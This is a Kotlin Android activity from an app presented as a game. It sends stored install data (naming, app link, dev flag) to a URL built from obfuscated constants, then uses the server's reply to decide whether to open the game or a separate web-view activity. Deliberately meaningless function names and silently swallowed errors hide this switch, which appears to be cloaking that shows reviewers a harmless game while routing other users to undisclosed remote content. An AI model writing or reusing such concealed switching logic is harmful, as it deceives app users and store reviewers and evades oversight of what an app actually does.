package com.zerofour.realqueenblack

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.orhanobut.hawk.Hawk
import com.zerofour.R
import com.zerofour.realqueenblack.REALQUEENCONST.C1
import com.zerofour.realqueenblack.REALQUEENCONST.D1
import com.zerofour.realqueenblack.REALQUEENCONST.DEV
import com.zerofour.realqueenwhite.MainQueenGame
import kotlinx.android.synthetic.main.activity_filt.*
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class RealQueenFilt : AppCompatActivity() {
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filt)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = hsgdwylcosaocncabsc()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                txtMain.text = jsoup

                if (jsoup == REALQUEENCONST.jsoupCheck) {
                    Intent(applicationContext, MainQueenGame::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, RealQueenWeb::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun hsgdwylcosaocncabsc(): String {
        val hawk: String? = Hawk.get(C1, "null")
        val hawkAppLink: String? = Hawk.get(D1, "null")
        val hawkDevOrNot: String? = Hawk.get(DEV, "false")


        //added devModeCheck
        val forJsoupSetNaming: String = REALQUEENCONST.lru + REALQUEENCONST.odone + hawk + "&" + REALQUEENCONST.twoSub + hawkDevOrNot
        val forJsoupSetAppLnk: String = REALQUEENCONST.lru + REALQUEENCONST.odone + hawkAppLink + "&" +  REALQUEENCONST.twoSub + hawkDevOrNot

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                gsgsdfqwdwqdw(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                gsgsdfqwdwqdw(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun gsgsdfqwdwqdw(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}